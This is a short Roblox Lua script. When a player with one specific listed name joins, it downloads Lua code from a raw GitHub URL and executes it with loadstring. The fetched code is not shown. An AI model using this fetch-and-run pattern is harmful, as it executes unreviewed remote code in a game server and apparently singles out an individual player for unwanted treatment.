local annoying = {"IISpace_0234"}
 
game.Players.PlayerAdded:Connect(function(plr)
for i, v in pairs(annoying) do
if plr.Name == v then
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamerEmilianoFF/scripts/main/notiow.lua", true))()
end
end
end)
